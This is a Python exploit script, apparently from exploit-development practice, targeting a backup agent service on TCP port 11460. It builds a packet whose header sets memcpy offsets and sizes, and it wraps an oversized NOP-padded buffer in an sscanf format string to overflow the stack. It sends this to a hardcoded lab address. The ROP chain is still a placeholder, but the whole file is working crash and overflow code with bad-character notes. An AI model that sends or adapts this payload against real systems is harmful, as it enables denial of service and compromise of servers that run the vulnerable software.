import socket
import sys
import struct

CB_SSCANF = len("File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d")
CB_PSAGENTBUFFER = 0x300


def createPsAgentCommandHeader(opcode: int) -> str:
    psAgentCommandHeader = b""
    # psAgentCommandHeader = 0x30 && 0x30 / 4 = 12
    n = 12
    for i in range(1, n+1):
        val = 0x40 + i
        if val == 0x44:
            psAgentCommandHeader += struct.pack("<i", opcode)   # OUR OPCODE

        elif val == 0x45:                                       # FIRST MEMCPY
            # OFFSET: at 0056C8F1 offset added to &psAgentCommand. used as the const void* src argument for a memcpy
            psAgentCommandHeader += struct.pack("<i", 0x00)
        elif val == 0x46:
            # SIZE: at 0056C8DA size used as size_t sz for the 0x45 src buffer ; value can't be negative
            psAgentCommandHeader += struct.pack("<i",
                                                CB_PSAGENTBUFFER + CB_SSCANF)

        elif val == 0x47:                                       # SECOND MEMCPY
            # OFFSET: at 0056c92c offset added to &psAgentCommand. used as the const void* src argument for a memcpy
            psAgentCommandHeader += struct.pack("<i", 0x0)
        elif val == 0x48:
            # SIZE: at 0056C91F size used as size_t sz of the second src buffer ; value can't be negative
            psAgentCommandHeader += struct.pack("<i",
                                                CB_PSAGENTBUFFER + CB_SSCANF)

        elif val == 0x49:                                       # THIRD MEMCPY
            # OFFSET: at 0056C972 offset added to &psAgentCommand. used as the const void* src argument for a memcpy
            psAgentCommandHeader += struct.pack("<i", 0x0)
        elif val == 0x4a:
            # SIZE: at 0056C965 size used as size_t sz of the ???? src buffer ; maybe this value can be negative !
            psAgentCommandHeader += struct.pack("<i",
                                                CB_PSAGENTBUFFER + CB_SSCANF)

        else:
            psAgentCommandHeader += bytes([val]) * 4

    return psAgentCommandHeader

# BAD: 0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20


def buildRopChain() -> str:
    ropChain = b"\x42" * 4

    return ropChain


def createPsAgentBuffer() -> str:
    headPadding = b"\x90" * 276
    ropChain = buildRopChain()
    tailPadding = b"\x90" * \
        (CB_PSAGENTBUFFER - (len(headPadding) + len(ropChain)))

    psCommandBuffer = headPadding + ropChain + tailPadding

    return psCommandBuffer


def connectServerGetSocket(server: str, port: int) -> socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    return s


def sendPayloadCloseSocket(s: str, payload: str):
    s.send(payload)
    print("[+] Packet sent")
    s.close()


def main():
    sscanfSploit = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (
        createPsAgentBuffer(), 0, 0, 0, 0)
    socket = connectServerGetSocket("192.168.247.10", 11460)
    payload = createPsAgentCommandHeader(0x534) + sscanfSploit
    # The size of the total payload is needed in the first 4 bytes of the send buffer
    cbPayload = struct.pack(">I", len(payload))
    payload = cbPayload + payload
    sendPayloadCloseSocket(socket, payload)

    sys.exit(0)


if __name__ == "__main__":
    main()
